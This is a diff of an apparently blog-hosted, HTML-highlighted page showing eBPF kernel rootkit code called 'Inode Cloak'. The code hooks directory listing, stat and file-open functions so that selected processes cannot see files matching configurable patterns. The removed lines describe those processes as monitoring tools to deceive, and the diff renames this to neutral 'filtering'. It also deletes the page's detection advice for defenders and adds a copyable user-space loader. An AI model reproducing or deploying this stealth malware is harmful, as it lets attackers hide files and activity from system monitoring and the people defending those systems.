+    <span class="kt">char</span> <span class="n">comm</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">];</span>
+    <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm</span><span class="p">));</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">should_filter_command</span><span class="p">(</span><span class="n">comm</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Add this process to our tracking map</span>
+        <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// Helper function to check if a file should be hidden</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">should_hide_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">namelen</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">init_targets</span><span class="p">();</span>
+    
+    <span class="c1">// Check against our list of hidden file patterns</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_HIDDEN_FILES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hidden_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pattern</span> <span class="o">||</span> <span class="n">pattern</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
+            <span class="k">continue</span><span class="p">;</span>
+        
+        <span class="c1">// Get pattern length</span>
+        <span class="kt">int</span> <span class="n">pattern_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="cp">#pragma unroll
+</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">MAX_PATH_LEN</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">pattern</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">pattern_len</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="n">pattern_len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">continue</span><span class="p">;</span>
+        
+        <span class="c1">// Check if pattern is a prefix</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">namelen</span> <span class="o">&gt;=</span> <span class="n">pattern_len</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">bool</span> <span class="n">match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+            
+            <span class="cp">#pragma unroll
+</span>            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">MAX_PATH_LEN</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;=</span> <span class="n">pattern_len</span><span class="p">)</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    
+                <span class="k">if</span> <span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">pattern</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
+                    <span class="n">match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            
+            <span class="k">if</span> <span class="p">(</span><span class="n">match</span><span class="p">)</span>
+                <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        
+        <span class="c1">// Check if pattern is a suffix</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">namelen</span> <span class="o">&gt;=</span> <span class="n">pattern_len</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">bool</span> <span class="n">match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+            
+            <span class="cp">#pragma unroll
+</span>            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">MAX_PATH_LEN</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;=</span> <span class="n">pattern_len</span><span class="p">)</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    
+                <span class="k">if</span> <span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="n">namelen</span> <span class="o">-</span> <span class="n">pattern_len</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">pattern</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
+                    <span class="n">match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            
+            <span class="k">if</span> <span class="p">(</span><span class="n">match</span><span class="p">)</span>
+                <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        
+        <span class="c1">// Check if pattern is contained within the name</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">namelen</span> <span class="o">&gt;=</span> <span class="n">pattern_len</span><span class="p">)</span> <span class="p">{</span>
+            <span class="cp">#pragma unroll
+</span>            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">start</span> <span class="o">&lt;=</span> <span class="n">namelen</span> <span class="o">-</span> <span class="n">pattern_len</span><span class="p">;</span> <span class="n">start</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">bool</span> <span class="n">match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+                
+                <span class="cp">#pragma unroll
+</span>                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">MAX_PATH_LEN</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;=</span> <span class="n">pattern_len</span><span class="p">)</span>
+                        <span class="k">break</span><span class="p">;</span>
+                        
+                    <span class="k">if</span> <span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="n">start</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">pattern</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
+                        <span class="n">match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+                        <span class="k">break</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                
+                <span class="k">if</span> <span class="p">(</span><span class="n">match</span><span class="p">)</span>
+                    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the directory iteration function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/iterate_dir"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_readdir</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dir_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
-    <span class="c1">// Check if this is a monitoring process we want to deceive</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_monitoring_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// Check if this process should be filtered</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">should_filter_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
         <span class="c1">// Set a flag in our map to filter directory entries</span>
-        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="n">u32</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">filter_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_filter_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Log the event</span>
+        <span class="k">struct</span> <span class="n">file_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">operation</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>  <span class="c1">// readdir</span>
+        
+        <span class="c1">// Try to get the file path</span>
+        <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
+        <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+        <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="n">path</span><span class="p">);</span>
+        
+        <span class="c1">// Send event to user space</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="c1">// Clear the flag for authorized processes</span>
-        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="n">u32</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">filter_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="c1">// Clear the flag for non-filtered processes</span>
+        <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_filter_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
@@ -619,14 +1099,26 @@
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_filldir</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dir_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span>
                <span class="kt">int</span> <span class="n">namelen</span><span class="p">,</span> <span class="n">loff_t</span> <span class="n">offset</span><span class="p">,</span> <span class="n">u64</span> <span class="n">ino</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d_type</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="c1">// Check if we should be filtering results</span>
-    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">u32</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
-    <span class="n">filter</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">filter_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+    <span class="c1">// Check if we should be filtering results for this process</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">filter</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_filter_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">filter</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">filter</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
         <span class="c1">// Check if this is a file we want to hide</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">is_hidden_file</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">namelen</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">should_hide_file</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">namelen</span><span class="p">))</span> <span class="p">{</span>
+            <span class="c1">// Log the event</span>
+            <span class="k">struct</span> <span class="n">file_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+            <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">operation</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>  <span class="c1">// readdir</span>
+            <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="n">name</span><span class="p">);</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">hidden</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            
+            <span class="c1">// Send event to user space</span>
+            <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+            
             <span class="c1">// Return 0 to skip this entry</span>
             <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
         <span class="p">}</span>
@@ -634,29 +1126,6 @@
     
     <span class="c1">// Let the original function run for other files</span>
     <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="c1">// Helper function to check if a file should be hidden</span>
-<span class="k">static</span> <span class="kr">inline</span> <span class="n">bool</span> <span class="nf">is_hidden_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">namelen</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="c1">// Check for our hidden file prefix</span>
-    <span class="kt">char</span> <span class="n">prefix</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"hid_"</span><span class="p">;</span>
-    
-    <span class="c1">// Simple prefix check (would be more sophisticated in real implementation)</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">namelen</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kt">char</span> <span class="n">file_prefix</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">prefix</span><span class="p">)];</span>
-        <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">file_prefix</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file_prefix</span><span class="p">),</span> <span class="n">name</span><span class="p">);</span>
-        
-        <span class="c1">// Compare prefixes</span>
-        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="n">file_prefix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">prefix</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
-                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
-        <span class="p">}</span>
-        
-        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
-    <span class="p">}</span>
-    
-    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="c1">// Hook stat operations to hide file metadata</span>
@@ -667,14 +1136,62 @@
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
-    <span class="c1">// Check if this is a monitoring process</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_monitoring_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// Check if this process should be filtered</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">should_filter_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
         <span class="c1">// Get the filename</span>
         <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
         <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">path</span><span class="o">-&gt;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
         
         <span class="c1">// Check if this is a file we want to hide</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">is_hidden_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">should_hide_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="c1">// Log the event</span>
+            <span class="k">struct</span> <span class="n">file_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+            <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">operation</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>  <span class="c1">// stat</span>
+            <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="n">filename</span><span class="p">);</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">hidden</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            
+            <span class="c1">// Send event to user space</span>
+            <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+            
+            <span class="c1">// Return an error to indicate file doesn't exist</span>
+            <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Let the original function run for other cases</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook file open operations to control access</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/do_filp_open"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_open</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dfd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">filename</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">flags</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Check if this process should be filtered</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">should_filter_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Get the filename</span>
+        <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
+        <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">pathname</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+        
+        <span class="c1">// Check if this is a file we want to hide</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">should_hide_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="c1">// Log the event</span>
+            <span class="k">struct</span> <span class="n">file_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+            <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">operation</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  <span class="c1">// open</span>
+            <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="n">filename</span><span class="p">);</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">hidden</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            
+            <span class="c1">// Send event to user space</span>
+            <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+            
             <span class="c1">// Return an error to indicate file doesn't exist</span>
             <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
         <span class="p">}</span>
@@ -684,19 +1201,378 @@
     <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="user-space-control-program">User-Space Control Program</h3>
 
-<h3 id="detection-methods">Detection Methods</h3>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// User-space program to load and control the Inode Cloak eBPF program</span>
 
-<p>Defenders should monitor for:</p>
-<ul>
-  <li>Unexpected eBPF programs attached to filesystem-related functions</li>
-  <li>Discrepancies between different methods of listing files</li>
-  <li>Files visible to some processes but not others</li>
-  <li>Unusual patterns of filesystem hook installations</li>
-  <li>Inconsistencies between filesystem state and monitoring tool reports</li>
-</ul>
